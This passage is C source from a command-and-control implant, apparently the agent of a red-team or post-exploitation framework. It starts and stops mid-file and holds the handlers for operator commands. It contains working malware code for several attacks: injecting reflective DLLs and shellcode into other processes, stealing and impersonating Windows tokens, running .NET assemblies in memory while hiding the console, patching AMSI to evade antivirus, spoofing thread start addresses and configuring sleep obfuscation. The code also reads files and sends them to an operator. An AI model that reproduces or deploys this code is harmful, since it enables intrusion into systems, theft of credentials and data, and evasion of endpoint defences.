                goto CleanupDownload;
            }

            PackageAddBytes( Package, FileName, NameSize );
            PackageAddBytes( Package, Content,  FileSize );

        CleanupCat:
            if ( hFile )
            {
                Instance->Win32.NtClose( hFile );
                hFile = NULL;
            }

            if ( Content )
            {
                MemSet( Content, 0, FileSize );
                Instance->Win32.LocalFree( Content );
                Content = NULL;
            }
            break;
        }

        default:
        {
            PUTS( "FS SubCommand not found" );
            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );

LEAVE:
    PackageDestroy( Package );
}

VOID CommandInlineExecute( PPARSER DataArgs )
{
    DWORD   FunctionNameSize    = 0;
    DWORD   ObjectDataSize      = 0;
    DWORD   ArgSize             = 0;
    DWORD   Status              = 0;
    PCHAR   FunctionName        = ParserGetBytes( DataArgs, &FunctionNameSize );
    PCHAR   ObjectData          = ParserGetBytes( DataArgs, &ObjectDataSize );
    PCHAR   ArgBuffer           = ParserGetBytes( DataArgs, &ArgSize );
    INT32   Flags               = ParserGetInt32( DataArgs );

    // why? don't know anymore but I don't wanna touch it for now
    StringCopyA( FunctionName, FunctionName );

    FunctionName[ FunctionNameSize ] = 0;

    switch ( Flags )
    {
        case 0:
        {
            PUTS( "Use Non-Threaded CoffeeLdr" )
            Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
            if ( Status )
            {
                PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
            }
            break;
        }

        case 1:
        {
            PUTS( "Use Threaded CoffeeRunner" )
            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            break;
        }

        default:
        {
            PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance->Config.Implant.CoffeeThreaded )
            {
                PUTS( "Config is set to threaded" )
                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
            }
            else
            {
                PUTS( "Config is set to non-threaded" )
                Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
                if ( Status )
                {
                    PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
                }
            }

            break;
        }
    }

    MemSet( ObjectData, 0, ObjectDataSize );
}

VOID CommandInjectDLL( PPARSER DataArgs )
{
    PPACKAGE          Package   = PackageCreate( DEMON_COMMAND_INJECT_DLL );

    DWORD             DllSize   = 0;
    DWORD             Result    = 1;
    NTSTATUS          NtStatus  = STATUS_SUCCESS;
    PCHAR             DllBytes  = NULL;
    HANDLE            hProcess  = NULL;
    CLIENT_ID         ProcID    = { 0 };
    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };
    INJECTION_CTX     InjCtx    = { 0 };

    InjCtx.Technique = ParserGetInt32( DataArgs );
    InjCtx.ProcessID = ParserGetInt32( DataArgs );
    DllBytes         = ParserGetBytes( DataArgs, &DllSize );
    InjCtx.Parameter = ParserGetBytes( DataArgs, &InjCtx.ParameterSize );

    PRINTF( "Technique: %d\n", InjCtx.Technique )
    PRINTF( "ProcessID: %d\n", InjCtx.ProcessID )
    PRINTF( "DllBytes : %x [%d]\n", DllBytes, DllSize );
    PRINTF( "Parameter: %x [%d]\n", InjCtx.Parameter, InjCtx.ParameterSize );

    ProcID.UniqueProcess = InjCtx.ProcessID;

    NtStatus = Instance->Syscall.NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID );
    if ( NT_SUCCESS( NtStatus ) )
    {
        Result = DllInjectReflective( hProcess, DllBytes, DllSize, InjCtx.Parameter, InjCtx.ParameterSize, &InjCtx );
    }
    else
    {
        PUTS( "[-] NtOpenProcess: Failed to open process" )
        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
    }

    PRINTF( "Injected Result: %d\n", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandInjectShellcode( PPARSER DataArgs )
{
    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
    UINT32        ShellcodeSize  = 0;
    UINT32        ArgumentSize   = 0;

    BOOL          Inject         = ( BOOL )  ParserGetInt32( DataArgs );
    SHORT         Technique      = ( SHORT ) ParserGetInt32( DataArgs );
    SHORT         TargetArch     = ( SHORT ) ParserGetInt32( DataArgs );
    PVOID         ShellcodeBytes = ParserGetBytes( DataArgs, &ShellcodeSize );
    PVOID         ShellcodeArgs  = ParserGetBytes( DataArgs, &ArgumentSize );
    DWORD         TargetPID      = ParserGetInt32( DataArgs );

    DWORD         Result         = ERROR_SUCCESS;
    INJECTION_CTX InjectionCtx   = {
            .ProcessID      = TargetPID,
            .hThread        = NULL,
            .Arch           = TargetArch,
            .Parameter      = ShellcodeArgs,
            .ParameterSize  = ArgumentSize,
    };

    PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );

    if ( Inject )
    {
        // Inject into running process
        CLIENT_ID         ClientID = { TargetPID, 0 };
        NTSTATUS          NtStatus = 0;
        OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };

        NtStatus = Instance->Syscall.NtOpenProcess( &InjectionCtx.hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );

        if ( ! NT_SUCCESS( NtStatus ) )
        {
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
            return;
        }
    }
    else
    {
        // Spawn & Inject
    }

    Technique = Technique == 0 ? Instance->Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config

    PRINTF( "Technique going to be used => %d\n", Technique )

    Result = ShellcodeInjectDispatch(
        Inject,
        Technique,
        ShellcodeBytes,
        ShellcodeSize,
        &InjectionCtx
    );

    PRINTF( "Injection Result => %d", Result )

    PackageAddInt32( Package, Result );
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSpawnDLL( PPARSER DataArgs )
{
    PPACKAGE      Package   = NULL;
    INJECTION_CTX InjCtx    = { 0 };
    DWORD         DllSize   = 0;
    DWORD         ArgSize   = 0;
    PCHAR         DllBytes  = ParserGetBytes( DataArgs, &DllSize );
    PCHAR         Arguments = ParserGetBytes( DataArgs, &ArgSize );

    Package = PackageCreate( DEMON_COMMAND_SPAWN_DLL );

    if ( DllSpawnReflective( DllBytes, DllSize, Arguments, ArgSize, &InjCtx ) )
        PackageAddInt32( Package, TRUE );
    else
        PackageAddInt32( Package, FALSE );

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandToken( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_TOKEN );
    DWORD    Command = ParserGetInt32( Parser );

    PRINTF( "Command => %d\n", Command )

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case 0x1:
        {
            PUTS( "Token::Impersonate" )
            DWORD            dwTokenID = ParserGetInt32( Parser );
            PTOKEN_LIST_DATA TokenData = NULL;

            TokenData = TokenGet( dwTokenID );

            if ( ! TokenData )
            {
                PUTS( "Token not found in vault." )
                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                return;
            }

            TokenSetPrivilege( SE_DEBUG_NAME, TRUE );

            if ( ! Instance->Win32.RevertToSelf() )
                SEND_WIN32_BACK

            if ( Instance->Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
            {
                Instance->Tokens.Impersonate = TRUE;
                Instance->Tokens.Token       = TokenData;

                PRINTF( "[+] Successful impersonated: %s\n", TokenData->DomainUser );

                PackageAddInt32( Package, TRUE );
            }
            else
            {
                Instance->Tokens.Impersonate = FALSE;
                Instance->Tokens.Token       = NULL;

                PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );

                SEND_WIN32_BACK

                PackageAddInt32( Package, FALSE );

                if ( ! Instance->Win32.RevertToSelf() )
                    SEND_WIN32_BACK
            }

            PackageAddBytes( Package, TokenData->DomainUser, StringLengthA( TokenData->DomainUser ) );
            break;
        }

        case 0x2:
        {
            PUTS( "Token::Steal" )
            DWORD  TargetPid   = ParserGetInt32( Parser );
            HANDLE StolenToken = TokenSteal( TargetPid );
            DWORD  UserSize    = 0;
            PUCHAR User        = NULL;
            DWORD  NewTokenID  = 0;

            if ( ! StolenToken )
            {
                PUTS( "[!] Couldn't get remote process token" )
                return;
            }

            User       = TokenGetUserDomain( StolenToken, &UserSize );
            NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );

            PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );

            PackageAddBytes( Package, User, UserSize );
            PackageAddInt32( Package, NewTokenID );
            PackageAddInt32( Package, TargetPid );

            break;
        }

        case 0x3:
        {
            PUTS( "Token::List" )
            PTOKEN_LIST_DATA TokenList  = Instance->Tokens.Vault;
            DWORD            TokenIndex = 0;

            do {
                if ( TokenList != NULL )
                {
                    PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );

                    PackageAddInt32( Package, TokenIndex );
                    PackageAddInt32( Package, TokenList->Handle );
                    PackageAddBytes( Package, TokenList->DomainUser, StringLengthA( TokenList->DomainUser ) );
                    PackageAddInt32( Package, TokenList->dwProcessID );
                    PackageAddInt32( Package, TokenList->Type );

                    TokenList = TokenList->NextToken;
                }
                else
                    break;

                TokenIndex++;
            } while ( TRUE );
            break;
        }

        case 0x4:
        {
            PUTS( "Token::PrivsGetOrList" )
            PTOKEN_PRIVILEGES TokenPrivs = NULL;
            DWORD             TPSize      = 0;
            DWORD             Length      = 0;
            HANDLE            TokenHandle = NULL;
            BOOL              ListPrivs   = ParserGetInt32( Parser );
            DWORD             UserSize    = 0;

            PackageAddInt32( Package, ListPrivs );

            if ( ListPrivs )
            {
                PUTS( "Privs::List" )
                TokenHandle = TokenCurrentHandle();

                Instance->Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, 0, &TPSize );
                TokenPrivs = Instance->Win32.LocalAlloc( LPTR, ( TPSize + 1 ) * sizeof( TOKEN_PRIVILEGES ) );

                CHAR Name[ MAX_PATH ] = { 0 };

                if ( TokenPrivs )
                {
                    if ( Instance->Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TPSize, &TPSize ) )
                    {
                        for ( INT i = 0; i < TokenPrivs->PrivilegeCount; i++ )
                        {
                            Length = MAX_PATH;
                            Instance->Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
                            PackageAddBytes( Package, Name, Length );
                            PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
                        }
                    }
                }
            }
            else
            {
                PUTS( "Privs::Get" )
            }

            MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
            Instance->Win32.LocalFree( TokenPrivs );
            TokenPrivs = NULL;

            break;
        }

        case 0x5:
        {
            PUTS( "Token::Make" )
            DWORD  dwUserSize     = 0;
            DWORD  dwPasswordSize = 0;
            DWORD  dwDomainSize   = 0;
            PCHAR  lpDomain       = ParserGetBytes( Parser, &dwDomainSize );
            PCHAR  lpUser         = ParserGetBytes( Parser, &dwUserSize );
            PCHAR  lpPassword     = ParserGetBytes( Parser, &dwPasswordSize );
            UCHAR  Deli[ 2 ]      = { '\\', 0 };
            HANDLE hToken         = NULL;
            PCHAR  UserDomain     = NULL;
            DWORD  Type           = NULL;
            LPSTR  BufferUser     = NULL;
            LPSTR  BufferPassword = NULL;
            LPSTR  BufferDomain   = NULL;
            DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;

            if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
            {
                PRINTF( "Create new token: Domain:[%s] User:[%s] Password:[%s]", lpDomain, lpUser, lpPassword )

                lpUser[ dwUserSize ]         = 0;
                lpPassword[ dwPasswordSize ] = 0;
                lpDomain[ dwDomainSize ]     = 0;

                hToken = TokenMake( lpUser, lpPassword, lpDomain );
                if ( hToken != NULL )
                {
                    UserDomain = Instance->Win32.LocalAlloc( LPTR, UserDomainSize );

                    MemSet( UserDomain, 0, UserDomainSize );

                    StringConcatA( UserDomain, lpDomain );
                    StringConcatA( UserDomain, Deli );
                    StringConcatA( UserDomain, lpUser );

                    BufferUser     = Instance->Win32.LocalAlloc( LPTR, dwUserSize );
                    BufferPassword = Instance->Win32.LocalAlloc( LPTR, dwPasswordSize );
                    BufferDomain   = Instance->Win32.LocalAlloc( LPTR, dwDomainSize );

                    MemCopy( BufferUser, lpUser, dwUserSize );
                    MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                    MemCopy( BufferDomain,lpDomain, dwDomainSize );

                    TokenAdd( hToken, UserDomain, TOKEN_TYPE_MAKE_NETWORK, NtCurrentTEB()->ClientId.UniqueProcess, BufferUser, BufferDomain, BufferPassword );

                    PRINTF( "UserDomain => %s\n", UserDomain )

                    PackageAddBytes( Package, UserDomain, UserDomainSize );
                }
            }

            break;
        }

        case 0x6:
        {
            PUTS( "Token::GetUID" )

            DWORD           cbSize     = sizeof( TOKEN_ELEVATION );
            TOKEN_ELEVATION Elevation  = { 0 };
            HANDLE          hToken     = TokenCurrentHandle( );
            NTSTATUS        NtStatus   = STATUS_SUCCESS;
            DWORD           dwUserSize = 0;
            PCHAR           User       = NULL;

            PRINTF( "[x] hToken: 0x%x\n", hToken );

            if ( ! hToken )
                return;

            if ( ! NT_SUCCESS( NtStatus = Instance->Syscall.NtQueryInformationToken( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) )
            {
                PUTS( "NtQueryInformationToken: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                return;
            }
            PUTS( "NtQueryInformationToken: Success" )

            User = TokenGetUserDomain( hToken, &dwUserSize );

            PackageAddInt32( Package, Elevation.TokenIsElevated );
            PackageAddBytes( Package, User, dwUserSize );

            Instance->Win32.NtClose( hToken );

            break;
        }

        case 0x7:
        {
            PUTS( "Token::Revert" )
            BOOL Success = Instance->Win32.RevertToSelf();

            PackageAddInt32( Package, Success );

            if ( ! Success )
                SEND_WIN32_BACK;

            Instance->Tokens.Token       = NULL;
            Instance->Tokens.Impersonate = FALSE;

            break;
        }

        case 0x8:
        {
            PUTS( "Token::Remove" )
            DWORD TokenVaultID = ParserGetInt32( Parser );
            BOOL  Success      = TokenRemove( TokenVaultID );

            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, TokenVaultID );

            break;
        }

        case 0x9:
        {
            PUTS( "Token::Clear" )

            TokenClear();

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}


VOID CommandAssemblyInlineExecute( PPARSER DataArgs )
{
    PPACKAGE PackageInfo                = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );

    SIZE_T  AppDomainNameSize           = 0;
    SIZE_T  NetVersionSize              = 0;
    SIZE_T  assemblyBytesLen            = 0;
    SIZE_T  ArgumentsLen                = 0;

    PUCHAR  pipePath                    = ParserGetBytes( DataArgs, NULL);
    PUCHAR  AppDomainName               = ParserGetBytes( DataArgs, &AppDomainNameSize);
    PUCHAR  NetVersion                  = ParserGetBytes( DataArgs, &NetVersionSize);
    PUCHAR  assemblyBytes               = ParserGetBytes( DataArgs, &assemblyBytesLen);
    PUCHAR  Arguments                   = ParserGetBytes( DataArgs, &ArgumentsLen);

    WCHAR   wAppDomainName[ MAX_PATH ]  = { 0 };
    WCHAR   wNetVersion[ 20 ]           = { 0 };
    PWCHAR  wArguments                  = Instance->Win32.LocalAlloc( LPTR, ArgumentsLen * sizeof( WCHAR ) );

    // CLR & .Net Instances
    ICLRMetaHost*       pClrMetaHost        = { NULL };
    ICLRRuntimeInfo*    pClrRuntimeInfo     = { NULL };
    ICorRuntimeHost*    pICorRuntimeHost    = { NULL };
    IEnumUnknown*       pEnumClr            = { NULL };
    ICLRRuntimeInfo*    pRunTimeInfo        = { NULL };
    Assembly*           pAssembly           = { NULL };
    IUnknown*           pAppDomainThunk     = { NULL };
    AppDomain*          pAppDomain          = { NULL };
    MethodInfo*         pMethodInfo         = { NULL };
    VARIANT             vtPsa               = { 0 };
    LPVOID              pvData              = { NULL };

    //Attach or create console
    BOOL                attConsole          = FALSE;

    // Convert Ansi Strings to Wide Strings
    CharStringToWCharString( wAppDomainName, AppDomainName, AppDomainNameSize );
    CharStringToWCharString( wNetVersion, NetVersion, NetVersionSize );
    CharStringToWCharString( wArguments, Arguments, ArgumentsLen );

#ifdef DEBUG
    printf("[^] pipePath          : %s\n", pipePath);
    printf("[^] AppDomainName     : %ls\n", wAppDomainName);
    printf("[^] NetVersion        : %ls\n", wNetVersion);
    printf("[^] assemblyBytes[%d] : %p\n", assemblyBytesLen, assemblyBytes);
    printf("[^] Arguments         : %ls\n", wArguments);
#endif

    if ( assemblyBytes == NULL ) return;

    HANDLE mainHandle   = Instance->Win32.CreateNamedPipeA( pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL );
    HANDLE hFile        = Instance->Win32.CreateFileA( pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES) NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );

    attConsole = Instance->Win32.GetConsoleWindow( ) != NULL;
    if ( attConsole != 1 )
    {
        Instance->Win32.AllocConsole( );

        HWND wnd = Instance->Win32.GetConsoleWindow( );
        if (wnd)
            Instance->Win32.ShowWindow( wnd, SW_HIDE );
    }

    // Hosting CLR
    if ( ! W32CreateClrInstance( wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost ) )
    {
        PUTS("Couldn't start CLR")
        return;
    }

    // Patch AMSI
    if ( Instance->Session.OSVersion > WIN_VERSION_10 )
    {
        PUTS( "Try to patch amsi" )
        PackageAddInt32( PackageInfo, 1 );
        if ( AmsiPatched == FALSE )
        {
            if ( BypassPatchAMSI( ) == TRUE )
            {
                PUTS("[+] Successful patched AMSI")
                AmsiPatched = TRUE;
                PackageAddInt32( PackageInfo, 0 );
            } else {
                PUTS("[-] Something went wrong")
                PackageAddInt32( PackageInfo, 1 );
            }
        } else {
            PUTS( "Amsi already patched" );
            PackageAddInt32( PackageInfo, 2 );
        }
        PackageTransmit( PackageInfo, NULL, NULL );

    }

    PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
    PackageAddInt32( PackageInfo, 2 );

    // TODO: check if specified dotnet version is available. if not then use the found dotnet version instead + check if file is capable of running under the found dotnet version
    if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
    {
        DWORD dwStringSize = 0;
        while ( TRUE )
        {
            IUnknown*   UPTR       = { 0 };
            ULONG       fetched    = 0;

            if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
            {
                pRunTimeInfo = ( ICLRRuntimeInfo* ) { UPTR };
                if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                {
                    LPVOID Version = Instance->Win32.LocalAlloc( LPTR, dwStringSize );

                    if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                    {
                        dwStringSize = WCharStringToCharString( ( PCHAR ) Version, Version, dwStringSize * 2 );
                        PackageAddBytes( PackageInfo, Version, dwStringSize );

                        PRINTF("[*] Version[ %d ]: %s\n", dwStringSize, Version );
                    }

                    Instance->Win32.LocalFree( Version );
                } else PUTS("Failed Got Version String")

            } else break;
        }
    } else PUTS( "Failed to enumerate" )

    PackageTransmit( PackageInfo, NULL, NULL );

    SAFEARRAYBOUND rgsabound[1] = { 0 };
    rgsabound[0].cElements = assemblyBytesLen;
    rgsabound[0].lLbound = 0;
    SAFEARRAY* pSafeArray = Instance->Win32.SafeArrayCreate(VT_UI1, 1, rgsabound);

    if ( pICorRuntimeHost->lpVtbl->CreateDomain( pICorRuntimeHost, wAppDomainName, NULL, &pAppDomainThunk ) != S_OK )
        goto Cleanup;

    if ( pAppDomainThunk->lpVtbl->QueryInterface( pAppDomainThunk, &xIID_AppDomain, &pAppDomain ) != S_OK )
        goto Cleanup;

    if ( Instance->Win32.SafeArrayAccessData( pSafeArray, &pvData ) != S_OK )
        goto Cleanup;

    MemCopy(pvData, assemblyBytes, assemblyBytesLen);

    if ( Instance->Win32.SafeArrayUnaccessData( pSafeArray ) != S_OK )
    {
        PUTS("[-] (SafeArrayUnaccessData) !!")
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
    }

    PUTS("Load_3")
    if ( pAppDomain->lpVtbl->Load_3( pAppDomain, pSafeArray, &pAssembly ) != S_OK )
        goto Cleanup;

    PUTS("Entrypoint")
    if ( pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo) != S_OK )
        goto Cleanup;

    VARIANT retVal  = { 0 };
    VARIANT obj     = { 0 };
    obj.vt = VT_NULL;

    PUTS("Prepare assembly args")
    SAFEARRAY* psaStaticMethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

    DWORD   argumentCount;
    LPWSTR* argumentsArray = Instance->Win32.CommandLineToArgvW( wArguments, &argumentCount );

    argumentsArray++;
    argumentCount--;

    vtPsa.vt = ( VT_ARRAY | VT_BSTR );
    vtPsa.parray = Instance->Win32.SafeArrayCreateVector( VT_BSTR, 0, argumentCount );

    for ( INT i = 0; i <= argumentCount; i++ )
        Instance->Win32.SafeArrayPutElement( vtPsa.parray, &i, Instance->Win32.SysAllocString( argumentsArray[ i ] ) );

    long idx[1] = { 0 };
    Instance->Win32.SafeArrayPutElement(psaStaticMethodArgs, idx, &vtPsa);


    HANDLE stdOutput = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE , hFile );

    PUTS( "Invoke Assembly" )
    if ( pMethodInfo->lpVtbl->Invoke_3( pMethodInfo, obj, psaStaticMethodArgs, &retVal ) != S_OK )
        goto Cleanup;

    DWORD   BytesToRead     = 65535;
    DWORD   bytesRead       = 0;
    LPVOID  AssemblyOutput  = Instance->Win32.LocalAlloc( LPTR, BytesToRead );

    //TODO: Replace with NtReadFile
    Instance->Win32.ReadFile( mainHandle, AssemblyOutput, BytesToRead, &bytesRead, NULL );
    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, stdOutput );


    PPACKAGE package = PackageCreate( DEMON_OUTPUT );
    PackageAddBytes( package, AssemblyOutput, bytesRead );
    PackageTransmit( package, NULL, NULL );

Cleanup:
    Instance->Win32.NtClose( mainHandle );
    Instance->Win32.NtClose( hFile );

#ifndef DEBUG
    Instance->Win32.FreeConsole();
#endif

    if ( AssemblyOutput )
    {
        MemSet( AssemblyOutput, 0, BytesToRead );
        Instance->Win32.LocalFree( AssemblyOutput );
    }

    if ( NULL != psaStaticMethodArgs )
    {
        Instance->Win32.SafeArrayDestroy( psaStaticMethodArgs );
        psaStaticMethodArgs = NULL;
    }

    if ( pMethodInfo != NULL )
    {
        pMethodInfo->lpVtbl->Release( pMethodInfo );
        pMethodInfo = NULL;
    }

    if ( pAssembly != NULL )
    {
        pAssembly->lpVtbl->Release( pAssembly );
        pAssembly = NULL;
    }

    if (pAppDomain != NULL)
    {
        pAppDomain->lpVtbl->Release( pAppDomain );
        pAppDomain = NULL;
    }

    if ( pAppDomainThunk != NULL )
        pAppDomainThunk->lpVtbl->Release( pAppDomainThunk );

    if ( pICorRuntimeHost != NULL )
    {
        pICorRuntimeHost->lpVtbl->UnloadDomain( pICorRuntimeHost, pAppDomainThunk );
        pICorRuntimeHost->lpVtbl->Stop( pICorRuntimeHost );
        pICorRuntimeHost = NULL;
    }

    if ( pClrRuntimeInfo != NULL )
    {
        pClrRuntimeInfo->lpVtbl->Release( pClrRuntimeInfo );
        pClrRuntimeInfo = NULL;
    }

    if ( pClrMetaHost != NULL )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }
}

VOID CommandAssemblyListVersion( VOID )
{
    PUTS("List dotnet versions")

    PPACKAGE            Package             = PackageCreate( DEMON_COMMAND_ASSEMBLY_VERSIONS );
    ICLRMetaHost*       pClrMetaHost        = { NULL };
    IEnumUnknown*       pEnumClr            = { NULL }; // TODO: close?
    ICLRRuntimeInfo*    pRunTimeInfo        = { NULL }; // TODO: close?

    if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, &pClrMetaHost ) == S_OK )
    {
        if ( ( pClrMetaHost )->lpVtbl->EnumerateInstalledRuntimes( pClrMetaHost, &pEnumClr ) == S_OK )
        {
            DWORD dwStringSize = 0;
            while ( TRUE )
            {
                IUnknown *UPTR      = { 0 };
                ULONG    fetched    = 0;

                if ( pEnumClr->lpVtbl->Next( pEnumClr, 1, &UPTR, &fetched ) == S_OK )
                {
                    pRunTimeInfo = ( ICLRRuntimeInfo* ) { UPTR };
                    if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, NULL, &dwStringSize ) == HRESULT_FROM_WIN32( ERROR_INSUFFICIENT_BUFFER ) && dwStringSize > 0 )
                    {
                        LPVOID Version = Instance->Win32.LocalAlloc( LPTR, dwStringSize );

                        if ( pRunTimeInfo->lpVtbl->GetVersionString( pRunTimeInfo, Version, &dwStringSize ) == S_OK )
                        {
                            dwStringSize = WCharStringToCharString( ( PCHAR ) Version, Version, dwStringSize * 2 );
#ifdef DEBUG
                            printf("[*] Version[ %d ]: %s\n", dwStringSize, Version );
#endif
                            PackageAddBytes( Package, Version, dwStringSize );
                        }

                        Instance->Win32.LocalFree( Version );
                    }
                    else
                        PUTS("Failed Got Version String")
                }
                else break;
            }
        }
        else
            PUTS("Failed to enumerate")
    }
    else
        PUTS("Failed to CLRCreateInstance");

    if ( pClrMetaHost )
    {
        pClrMetaHost->lpVtbl->Release( pClrMetaHost );
        pClrMetaHost = NULL;
    }

    if ( pEnumClr )
    {
        pEnumClr->lpVtbl->Release( pEnumClr );
        pEnumClr = NULL;
    }

    if ( pRunTimeInfo )
    {
        pRunTimeInfo->lpVtbl->Release( pRunTimeInfo );
        pRunTimeInfo = NULL;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandConfig( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_CONFIG );
    UINT32   Config  = ParserGetInt32( Parser );

    PackageAddInt32( Package, Config );

    switch ( Config )
    {
        case DEMON_CONFIG_SHOW_ALL:
        {
            break;
        }

        case DEMON_CONFIG_IMPLANT_SPFTHREADADDR:
        {
            DWORD   LibSize    = 0;
            DWORD   FuncSize   = 0;
            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            Library[ LibSize ] = 0;
            Function[ FuncSize ] = 0;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
                    if ( ThreadAddr )
                        Instance->Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddBytes( Package, Library, LibSize );
            PackageAddBytes( Package, Function, FuncSize );

            break;
        }

        case DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE:
        {
            Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( Parser );
            PRINTF( "Set sleep obfuscation technique to %d\n", Instance->Config.Implant.SleepMaskTechnique )
            PackageAddInt32( Package, Instance->Config.Implant.SleepMaskTechnique );
            break;
        }

        case DEMON_CONFIG_IMPLANT_VERBOSE:
        {
            Instance->Config.Implant.Verbose = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.Verbose );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_VEH:
        {
            Instance->Config.Implant.CoffeeVeh = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.CoffeeVeh );
            break;
        }

        case DEMON_CONFIG_IMPLANT_COFFEE_THREADED:
        {
            Instance->Config.Implant.CoffeeThreaded = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Implant.CoffeeThreaded );
            break;
        }

        case DEMON_CONFIG_MEMORY_ALLOC:
        {
            Instance->Config.Memory.Alloc = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Memory.Alloc );
            break;
        }

        case DEMON_CONFIG_MEMORY_EXECUTE:
        {
